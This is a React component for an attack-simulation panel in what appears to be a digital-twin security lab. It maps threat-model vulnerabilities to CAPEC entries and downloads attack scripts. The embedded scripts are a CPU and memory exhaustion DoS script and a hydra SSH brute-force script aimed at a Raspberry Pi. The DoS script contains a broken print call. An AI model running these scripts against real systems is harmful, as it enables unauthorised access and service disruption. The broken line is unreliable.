import React, { useState } from 'react';
import { ChartProps } from '../Chart';

const AttackChart = (props: ChartProps) => {
  const { records } = props;
  const node =
    records && records[0] && records[0]._fields && records[0]._fields[0]
      ? records[0]._fields[0]
      : {};

  const [threatModel, setThreatModel] = useState<any | null>(null);

  const [selectedVulnKeys, setSelectedVulnKeys] = useState<string[]>([]);

  const [selectedPredefinedAttacks, setSelectedPredefinedAttacks] = useState<string[]>([]);
  const [selectedCapecIds, setSelectedCapecIds] = useState<string[]>([]);

  const handleRetrieveThreatModel = async () => {
    try {
      const response = await fetch('http://localhost:5003/minio_get_last_threat_model');
      if (!response.ok) {
        alert('Failed to retrieve threat model.');
        return;
      }
      const data = await response.json(); // full JSON dict from backend
      setThreatModel(data);               // store everything in React state
      setSelectedVulnKeys([]);
      setSelectedCapecIds([]);
      console.log('Threat model dictionary:', data);
    } catch (error) {
      console.error('[AttackChart.tsx] Error:', error);
      alert('Failed to retrieve threat model.');
    }
  };


  const handleVulnToggle = (key: string) => {
    setSelectedVulnKeys((prev) =>
      prev.includes(key) ? prev.filter((k) => k !== key) : [...prev, key]
    );
  };

  // Get selected threats (vulnerabilities) as objects
  const getSelectedThreats = (): { assetName: string; threat: any }[] => {
    if (!threatModel) return [];
    const results: { assetName: string; threat: any }[] = [];

    selectedVulnKeys.forEach((key) => {
      const [assetName, idxStr] = key.split('::');
      const asset = threatModel[assetName];
      if (!asset || !asset.threats) return;
      const idx = parseInt(idxStr, 10);
      if (Number.isNaN(idx)) return;
      const threat = asset.threats[idx];
      if (threat) {
        results.push({ assetName, threat });
      }
    });

    return results;
  };

  const selectedThreats = getSelectedThreats();

  type CapecInfo = {
    id: string;
    name?: string;
    tools?: string;
  };

  const normalizeCapec = (raw: any): CapecInfo | null => {
    if (!raw) return null;

    // String or number form, e.g. "CAPEC-123" or "123"
    if (typeof raw === 'string' || typeof raw === 'number') {
      const id = String(raw).trim();
      return id ? { id } : null;
    }

    if (typeof raw === 'object') {
      const id =
        raw.id !== undefined
          ? String(raw.id)
          : raw.capec_id !== undefined
          ? String(raw.capec_id)
          : undefined;
      if (!id) return null;

      const name =
        typeof raw.name === 'string'
          ? raw.name
          : typeof raw.title === 'string'
          ? raw.title
          : undefined;

      return { id: id.trim(), name: name?.trim() };
    }

    return null;
  };

  const capecsForSelectedVulns: CapecInfo[] = [];
  selectedThreats.forEach(({ threat }) => {
    const capecList = threat.capec_ids || threat.capecs || [];
    if (Array.isArray(capecList)) {
      capecList.forEach((c: any) => {
        const info = normalizeCapec(c);
        if (info && info.id) {
          capecsForSelectedVulns.push(info);
        }
      });
    }
  });

  // Deduplicate CAPECs by id (for Threat Model pane)
  const uniqueCapecs: CapecInfo[] = [];
  const seenCapecIds = new Set<string>();
  for (const c of capecsForSelectedVulns) {
    if (!seenCapecIds.has(c.id)) {
      seenCapecIds.add(c.id);
      uniqueCapecs.push(c);
    }
  }

  const handleCapecToggle = (id: string) => {
    setSelectedCapecIds((prev) =>
      prev.includes(id) ? prev.filter((c) => c !== id) : [...prev, id]
    );
  };


  const dosScript = `#!/usr/bin/env python3
import argparse
import threading
import time
import signal
import sys

def memory_hog(stop_event, mb_per_iter=1, delay=0.1):
    bag = []
    one_mb = 1024 * 1024
    while not stop_event.is_set():
        try:
            bag.append(bytearray(one_mb * mb_per_iter))
        except MemoryError:
            time.sleep(0.5)
        time.sleep(delay)

def cpu_hog(stop_event):
    while not stop_event.is_set():
        pass

def main():
    parser = argparse.ArgumentParser(description="Local CPU + memory DoS simulator for lab/digital twin use.")
    parser.add_argument("--mem-threads", type=int, default=10)
    parser.add_argument("--cpu-threads", type=int, default=5)
    parser.add_argument("--mb-per-iter", type=int, default=1)
    parser.add_argument("--sleep", type=float, default=0.1)
    args = parser.parse_args()

    stop_event = threading.Event()

    def handle_signal(signum, frame):
        stop_event.set()
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    threads = []
    for _ in range(args.mem_threads):
        t = threading.Thread(target=memory_hog, args=(stop_event, args.mb_per_iter, args.sleep), daemon=True)
        t.start(); threads.append(t)
    for _ in range(args.cpu_threads):
        t = threading.Thread(target=cpu_hog, args=(stop_event,), daemon=True)
        t.start(); threads.append(t)

    print(f("[INFO] Started {args.mem_threads} memory threads and {args.cpu_threads} CPU threads."))
    print("[INFO] Press Ctrl+C to stop.")
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=1.0)
        print("[INFO] Stopped. Threads joined.")

if __name__ == "__main__":
    sys.setrecursionlimit(1000000)
    main()
`;

  const bruteForceScript = `#!/bin/bash
# Brute Force Attack Simulation Script
# NOTE: Educational/digital twin use only!

TARGET_IP="<ADD_IP_ADDRESS>"
USERNAME="pi"
WORDLIST="/rockyou.txt"
OUTPUT_LOG="hydra_output.log"

if ! command -v hydra &> /dev/null; then
  echo "[ERROR] hydra is not installed. Please install it first (apt-get install hydra)."
  exit 1
fi

if [ ! -f "$WORDLIST" ]; then
  echo "[ERROR] Wordlist file not found at: $WORDLIST"
  exit 1
fi

echo "[INFO] Launching brute force attack on $TARGET_IP (username: $USERNAME)"
echo "[INFO] Using wordlist: $WORDLIST"
echo "[INFO] Output will be saved in $OUTPUT_LOG"

hydra -l "$USERNAME" -P "$WORDLIST" ssh://"$TARGET_IP" -t 4 -f -vV -o "$OUTPUT_LOG"

echo "[INFO] Hydra run complete. Check $OUTPUT_LOG for results."
echo
echo "[INFO] On the Raspberry Pi, run this to monitor authentication attempts in real-time:"
echo "    tail -f /var/log/auth.log"
`;

  const attackOptions = [
    // NOTE: all extensions now 'txt', since these are context + code in one .txt file
    { key: 'dos', label: 'Denial of Service (DoS)', content: dosScript, extension: 'txt' },
    { key: 'brute_force', label: 'Brute Force', content: bruteForceScript, extension: 'txt' },
    { key: 'injection', label: 'Injection Attack', content: '# TODO: Add injection attack script', extension: 'txt' },
    { key: 'rop', label: 'Return-Oriented Programming (ROP)', content: '# TODO: Add ROP attack script', extension: 'txt' },
  ];

  // Mapping from predefined attacks -> CAPECs (from your table)
  const PREDEFINED_CAPEC_MAP: Record<string, CapecInfo[]> = {
    dos: [
      {
        id: '469',
        name: 'HTTP DoS',
        tools: 'HTTP flooding',
      },
    ],
    brute_force: [
      {
        id: '112',
        name: 'Brute Force',
        tools: 'Repeated submissions of incorrect secret values',
      },
    ],
    injection: [
      {
        id: '108',
        name: 'Command Line Execution through SQL Injection',
        tools: 'MSSQL_xp_cmdshell directive for database is used.',
      },
      {
        id: '15',
        name: 'Command Delimiters',
        tools:
          'Network packet injection tools (netcat, nemesis, etc.). Inject directly to input fields, where possible. Inject through web test frameworks (proxies, TamperData, custom programs, etc.).',
      },
      {
        id: '43',
        name: 'Exploiting Multiple Input Interpretation Layers',
        tools: 'Perform command/SQL/XSS injection after determining encoding.',
      },
      {
        id: '6',
        name: 'Argument Injection',
        tools:
          'Automated or manual tool for weak service discovery (API, SQL…), and automated tool for injection.',
      },
      {
        id: '88',
        name: 'OS Command Injection',
        tools:
          'For identification: Port mapping, TCP/IP Fingerprinting, guessing. For injection: network packet injection tools (netcat, nemesis, etc.). Inject directly to input fields where possible. Inject through web test frameworks (proxies, TamperData, custom programs, etc.).',
      },
    ],
    rop: [
      // No explicit CAPECs provided TODO
    ],
  };

  const downloadTextAsFile = (content: string, filename: string) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);

    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    URL.revokeObjectURL(url);
  };

  const handlePredefinedAttackToggle = (key: string) => {
    setSelectedPredefinedAttacks((prev) =>
      prev.includes(key) ? prev.filter((k) => k !== key) : [...prev, key]
    );
  };

  const handleGenerateScripts = () => {
    if (selectedPredefinedAttacks.length === 0 && selectedCapecIds.length === 0) {
      alert('Please select at least one predefined attack or CAPEC entry.');
      return;
    }

    const threats = selectedThreats;

    // ---- Predefined attacks (now context + code in .txt) ----
    selectedPredefinedAttacks.forEach((key) => {
      const attack = attackOptions.find((a) => a.key === key);
      if (!attack) return;

      const mappedCapecs = PREDEFINED_CAPEC_MAP[key] || [];
      const mappedIds = mappedCapecs.map((c) => c.id);

      // Threats that have at least one of the mapped CAPEC IDs
      const relatedThreats =
        threats && mappedIds.length > 0
          ? threats.filter(({ threat }) => {
              const capecList = threat.capec_ids || threat.capecs || [];
              if (!Array.isArray(capecList)) return false;
              return capecList.some((raw: any) => {
                const info = normalizeCapec(raw);
                return info && mappedIds.includes(info.id);
              });
            })
          : [];

      const lines: string[] = [];

      lines.push(`# Predefined attack: ${attack.label}`);
      lines.push(`#`);
      if (mappedCapecs.length > 0) {
        lines.push(`# Associated CAPEC entries:`);
        mappedCapecs.forEach((c) => {
          const lineName = c.name ? ` (${c.name})` : '';
          lines.push(`#   - CAPEC-${c.id}${lineName}`);
          if (c.tools) {
            lines.push(`#       Tools/technique: ${c.tools}`);
          }
        });
      } else {
        lines.push(`# No CAPEC mapping defined for this attack.`);
      }
      lines.push(`#`);
      lines.push(`# Selected vulnerabilities relevant to this attack:`);
      if (relatedThreats.length === 0) {
        lines.push(`#   (none of the selected vulnerabilities match the mapped CAPEC IDs)`);
      } else {
        relatedThreats.forEach(({ assetName, threat }, idx) => {
          const capecList = threat.capec_ids || threat.capecs || [];
          const threatCapecs: CapecInfo[] = [];
          if (Array.isArray(capecList)) {
            capecList.forEach((raw: any) => {
              const info = normalizeCapec(raw);
              if (info && mappedIds.includes(info.id)) {
                threatCapecs.push(info);
              }
            });
          }

          const mitigations = threat.mitigations
            ? JSON.stringify(threat.mitigations, null, 2)
            : '[]';

          lines.push(`#   Vulnerability #${idx + 1}`);
          lines.push(`#     Asset: ${assetName}`);
          lines.push(`#     Name: ${threat.name}`);
          if (threatCapecs.length > 0) {
            lines.push(`#     CAPECs:`);
            threatCapecs.forEach((c) => {
              const lineName = c.name ? ` (${c.name})` : '';
              lines.push(`#       - CAPEC-${c.id}${lineName}`);
            });
          }
          lines.push(`#     Mitigations: ${mitigations}`);
          lines.push(`#`);
        });
      }

      lines.push('');
      lines.push('# ===============================================');
      lines.push('# Simulation step: run the following script');
      lines.push('# ===============================================');
      lines.push('#');
      lines.push('# Example usage:');
      if (key === 'dos') {
        lines.push('#   1. Save this script section as dos_attack.py');
        lines.push('#   2. Run: python3 dos_attack.py');
      } else if (key === 'brute_force') {
        lines.push('#   1. Save this script section as brute_force.sh');
        lines.push('#   2. Run: chmod +x brute_force.sh');
        lines.push('#   3. Run: ./brute_force.sh');
      } else {
        lines.push('#   1. Save the code block below as an appropriate script file');
        lines.push('#   2. Run it with the relevant interpreter or shell');
      }
      lines.push('#');
      lines.push('');
      lines.push('----- BEGIN ATTACK SCRIPT -----');
      lines.push(attack.content);
      lines.push('----- END ATTACK SCRIPT -----');

      const scriptContent = lines.join('\n');

      const safeKey = key.toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '');
      const filename = `${safeKey || 'attack'}_with_context.txt`;
      downloadTextAsFile(scriptContent, filename);
    });

    // ---- CAPEC-based scripts from threat model (unchanged, still .txt) ----
    if (!threatModel || selectedCapecIds.length === 0) return;

    selectedCapecIds.forEach((capecId) => {
      const relatedThreats = threats.filter(({ threat }) => {
        const capecList = threat.capec_ids || threat.capecs || [];
        if (!Array.isArray(capecList)) return false;
        return capecList.some((raw: any) => {
          const info = normalizeCapec(raw);
          return info && info.id === capecId;
        });
      });

      if (relatedThreats.length === 0) return;

      const capecInfo =
        uniqueCapecs.find((c) => c.id === capecId) || ({ id: capecId } as CapecInfo);

      const scriptContent = relatedThreats
        .map(({ assetName, threat }, idx) => {
          const capecList = threat.capec_ids || threat.capecs || [];
          const mitigations = threat.mitigations
            ? JSON.stringify(threat.mitigations, null, 2)
            : '[]';
          const possibleScript: string =
            threat.script || threat.attack_script || '# No concrete exploit script defined.\n';

          return [
            `# Asset: ${assetName}`,
            `# Vulnerability: ${threat.name}`,
            `# CAPEC ID: ${capecInfo.id}`,
            capecInfo.name ? `# CAPEC Name: ${capecInfo.name}` : '# CAPEC Name: (unknown)',
            `# Threat index: ${idx + 1}`,
            `# CAPEC entries for this threat: ${JSON.stringify(capecList, null, 2)}`,
            `# Mitigations: ${mitigations}`,
            '',
            possibleScript,
          ].join('\n');
        })
        .join('\n\n' + '#'.repeat(40) + '\n\n');

      const safeId = capecInfo.id
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, '_')
        .replace(/^_+|_+$/g, '');
      const filename = `capec_${safeId || 'exploit'}.txt`;
      downloadTextAsFile(scriptContent, filename);
    });
  };

  return (
    <div style={{ marginTop: '10px', height: '100%', textAlign: 'center' }}>
      <h3 style={{ marginBottom: '20px' }}>Attack Simulation Setup</h3>

      <div
        style={{
          display: 'inline-block',
          padding: '15px 20px',
          border: '1px solid ',
          borderRadius: '8px',
          textAlign: 'left',
          backgroundColor: '#fafafa',
          minWidth: '360px',
        }}
      >
        {/* Retrieve Threat Model */}
        <div style={{ marginBottom: '16px', textAlign: 'center' }}>
          <button
            style={{
              padding: '8px 18px',
              backgroundColor: '#28a745',
              color: '#fff',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: 500,
            }}
            onClick={handleRetrieveThreatModel}
          >
            Retrieve Threat Model
          </button>
        </div>

        {/* Assets and vulnerabilities (threat names) */}
        <div
          style={{
            maxHeight: '220px',
            overflowY: 'auto',
            paddingRight: '4px',
            border: '1px solid #ddd',
            borderRadius: '6px',
            marginBottom: '12px',
            background: '#fff',
          }}
        >
          {!threatModel && (
            <p style={{ fontSize: '14px', fontStyle: 'italic', color: '#666', padding: '8px' }}>
              Load the threat model to see assets and their vulnerabilities.
            </p>
          )}

          {threatModel &&
            Object.entries(threatModel as Record<string, any>).map(([assetName, assetData]) => {
              const threats = Array.isArray(assetData.threats) ? assetData.threats : [];
              return (
                <div key={assetName} style={{ padding: '8px 10px', borderBottom: '1px solid #eee' }}>
                  <div style={{ fontWeight: 600, marginBottom: '4px' }}>{assetName}</div>
                  {threats.length === 0 && (
                    <div style={{ fontSize: '13px', fontStyle: 'italic', color: '#888' }}>
                      No vulnerabilities listed.
                    </div>
                  )}
                  {threats.map((threat: any, idx: number) => {
                    const key = `${assetName}::${idx}`;
                    const label = threat.name || `Vulnerability #${idx + 1}`;
                    return (
                      <div
                        key={key}
                        style={{
                          marginBottom: '4px',
                          fontSize: '14px',
                          display: 'flex',
                          alignItems: 'center',
                        }}
                      >
                        <input
                          type="checkbox"
                          id={key}
                          checked={selectedVulnKeys.includes(key)}
                          onChange={() => handleVulnToggle(key)}
                          style={{ marginRight: '6px' }}
                        />
                        <label htmlFor={key}>{label}</label>
                      </div>
                    );
                  })}
                </div>
              );
            })}
        </div>

        {/* --- Visual separator between vulnerabilities and exploit options --- */}
        <div
          style={{
            borderTop: '1px solid #ccc',
            margin: '12px 0 14px',
          }}
        />

        {/* Predefined + CAPEC from Threat Model (both selectable) */}
        <>
          <div>
            {/* Predefined pane */}
            <div
              style={{
                padding: '8px 10px',
                borderRadius: '6px',
                border: '1px solid #ccc',
                marginBottom: '10px',
                background: '#fff',
              }}
            >
              <div style={{ fontWeight: 600, marginBottom: '6px' }}>Predefined Attacks</div>
              <div
                style={{
                  maxHeight: '140px',
                  overflowY: 'auto',
                  paddingRight: '4px',
                }}
              >
                {attackOptions.map((attack) => (
                  <div
                    key={attack.key}
                    style={{
                      marginBottom: '6px',
                      fontSize: '14px',
                      display: 'flex',
                      alignItems: 'center',
                    }}
                  >
                    <input
                      type="checkbox"
                      id={attack.key}
                      checked={selectedPredefinedAttacks.includes(attack.key)}
                      onChange={() => handlePredefinedAttackToggle(attack.key)}
                      style={{ marginRight: '6px' }}
                    />
                    <label htmlFor={attack.key}>{attack.label}</label>
                  </div>
                ))}
              </div>
            </div>

            {/* Threat model CAPEC pane */}
            <div
              style={{
                padding: '8px 10px',
                borderRadius: '6px',
                border: '1px solid #ccc',
                background: '#fff',
              }}
            >
              <div style={{ fontWeight: 600, marginBottom: '6px' }}>
                CAPEC from Selected Vulnerabilities
              </div>
              <div
                style={{
                  maxHeight: '140px',
                  overflowY: 'auto',
                  paddingRight: '4px',
                }}
              >
                {uniqueCapecs.length === 0 && (
                  <p style={{ fontSize: '13px', fontStyle: 'italic', color: '#666' }}>
                    Select vulnerabilities above to see associated CAPEC entries.
                  </p>
                )}
                {uniqueCapecs.map((c) => {
                  const label = c.name ? `${c.id}: ${c.name}` : c.id;
                  return (
                    <div
                      key={c.id}
                      style={{
                        marginBottom: '6px',
                        fontSize: '14px',
                        display: 'flex',
                        alignItems: 'center',
                      }}
                    >
                      <input
                        type="checkbox"
                        id={c.id}
                        checked={selectedCapecIds.includes(c.id)}
                        onChange={() => handleCapecToggle(c.id)}
                        style={{ marginRight: '6px' }}
                      />
                      <label htmlFor={c.id}>{label}</label>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>

          {/* Final generate button */}
          <div style={{ textAlign: 'center', marginTop: '16px' }}>
            <button
              style={{
                padding: '10px 20px',
                backgroundColor: '#007bff',
                color: '#fff',
                border: 'none',
                borderRadius: '5px',
                cursor: 'pointer',
                fontSize: '15px',
                fontWeight: 500,
              }}
              onClick={handleGenerateScripts}
            >
              Generate Scripts
            </button>
          </div>
        </>
      </div>
    </div>
  );
};

export default AttackChart;
